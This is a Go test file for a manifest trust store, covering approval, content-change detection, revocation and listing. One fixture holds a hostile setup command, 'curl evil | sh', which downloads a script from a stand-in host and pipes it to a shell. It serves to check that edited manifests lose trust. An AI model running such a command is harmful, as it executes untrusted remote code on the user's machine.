package trust

import (
	"os"
	"path/filepath"
	"testing"
)

func newTestStore(t *testing.T) *Store {
	t.Helper()
	return &Store{Dir: filepath.Join(t.TempDir(), "trust")}
}

func TestTrustLifecycle(t *testing.T) {
	s := newTestStore(t)
	manifest := "/code/app/twig.toml"
	content := []byte("[setup]\nrun = \"echo hi\"\n")

	ok, err := s.Check(manifest, content)
	if err != nil || ok {
		t.Fatalf("unknown manifest: ok=%v err=%v, want untrusted", ok, err)
	}

	if err := s.Approve(manifest, content); err != nil {
		t.Fatal(err)
	}
	if ok, _ := s.Check(manifest, content); !ok {
		t.Fatal("approved manifest should be trusted")
	}

	// Any content change requires re-approval.
	edited := []byte("[setup]\nrun = \"curl evil | sh\"\n")
	if ok, _ := s.Check(manifest, edited); ok {
		t.Fatal("edited content must not be trusted")
	}

	// The same content at a different path is a different approval.
	if ok, _ := s.Check("/code/other/twig.toml", content); ok {
		t.Fatal("same content at another path must not be trusted")
	}

	n, err := s.Revoke(manifest)
	if err != nil || n != 1 {
		t.Fatalf("revoke: n=%d err=%v, want 1 removal", n, err)
	}
	if ok, _ := s.Check(manifest, content); ok {
		t.Fatal("revoked manifest should be untrusted")
	}
}

func TestRevokeRemovesAllContentVersions(t *testing.T) {
	s := newTestStore(t)
	manifest := "/code/app/twig.toml"
	if err := s.Approve(manifest, []byte("v1")); err != nil {
		t.Fatal(err)
	}
	if err := s.Approve(manifest, []byte("v2")); err != nil {
		t.Fatal(err)
	}
	if err := s.Approve("/code/other/twig.toml", []byte("v1")); err != nil {
		t.Fatal(err)
	}

	n, err := s.Revoke(manifest)
	if err != nil || n != 2 {
		t.Fatalf("revoke: n=%d err=%v, want 2", n, err)
	}
	entries, err := s.List()
	if err != nil || len(entries) != 1 || entries[0].Path != "/code/other/twig.toml" {
		t.Errorf("entries after revoke = %+v, err=%v", entries, err)
	}
}

func TestListToleratesStrayFiles(t *testing.T) {
	s := newTestStore(t)
	if err := s.Approve("/code/app/twig.toml", []byte("x")); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(s.Dir, "junk.json"), []byte("not json"), 0o644); err != nil {
		t.Fatal(err)
	}
	entries, err := s.List()
	if err != nil || len(entries) != 1 {
		t.Errorf("entries = %+v, err=%v", entries, err)
	}
}
